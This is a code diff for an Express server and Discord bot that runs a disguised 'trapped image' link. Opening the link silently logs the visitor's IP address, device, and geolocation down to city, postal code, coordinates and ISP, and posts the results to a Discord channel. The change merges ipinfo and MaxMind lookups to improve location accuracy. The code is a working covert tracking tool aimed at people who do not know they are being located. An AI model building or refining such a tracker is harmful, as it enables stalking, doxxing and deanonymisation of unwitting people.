@@ -36,6 +36,15 @@ let lookup;
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
+function compareFields(ipinfoValue, maxmindValue) {
+  if (!ipinfoValue && !maxmindValue) return '❌ Introuvable';
+  if (ipinfoValue && !maxmindValue) return ipinfoValue;
+  if (!ipinfoValue && maxmindValue) return maxmindValue;
+  return ipinfoValue.toLowerCase() === maxmindValue.toLowerCase()
+    ? ipinfoValue
+    : `${ipinfoValue} / ${maxmindValue}`;
+}
+
 app.get('/image.jpg', async (req, res) => {
   const queryId = req.query.u;
   if (!queryId) return res.status(400).send("Lien invalide");
@@ -57,18 +66,21 @@ app.get('/image.jpg', async (req, res) => {
     ipinfo = response.data || {};
   } catch (e) {}
 
+  const coordMaxMind = geo?.location ? `${geo.location.latitude} , ${geo.location.longitude}` : null;
+  const coords = compareFields(ipinfo.loc, coordMaxMind);
+
   const embed = new EmbedBuilder()
     .setTitle("📸 Image piégée ouverte !")
     .setDescription(`**IP :** ${ip}\n**Appareil :** ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}`)
     .setColor(0xff6600)
     .addFields(
       { name: "🌍 Localisation", value: `
-**Pays :** ${ipinfo.country || geo?.country?.names?.fr || '❌'}
-**Région :** ${ipinfo.region || geo?.subdivisions?.[0]?.names?.fr || '❌'}
-**Ville :** ${ipinfo.city || geo?.city?.names?.fr || '❌'}
-**Code postal :** ${ipinfo.postal || geo?.postal?.code || '❌'}
-**Coordonnées :** ${ipinfo.loc || `${geo?.location?.latitude || '?'} , ${geo?.location?.longitude || '?'}`}
-**FAI :** ${ipinfo.org || geo?.traits?.isp || '❌'}
+**Pays :** ${compareFields(ipinfo.country, geo?.country?.names?.fr)}
+**Région :** ${compareFields(ipinfo.region, geo?.subdivisions?.[0]?.names?.fr)}
+**Ville :** ${compareFields(ipinfo.city, geo?.city?.names?.fr)}
+**Code postal :** ${compareFields(ipinfo.postal, geo?.postal?.code)}
+**Coordonnées :** ${coords}
+**FAI :** ${compareFields(ipinfo.org, geo?.traits?.isp)}
 `.trim() }
     )
     .setFooter({ text: "🔍 Tracker automatique", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
@@ -114,7 +126,6 @@ client.once(Events.ClientReady, async () => {
 
   if (!channel) return console.log("❌ Salon 'génère-lien-tracker' introuvable");
 
-  // Rechercher un ancien message du bot avec le tag spécial
   const messages = await channel.messages.fetch({ limit: 10 });
   const oldMsg = messages.find(msg => msg.author.id === client.user.id && msg.content.includes("[TRACKER_BOUTON]"));
 
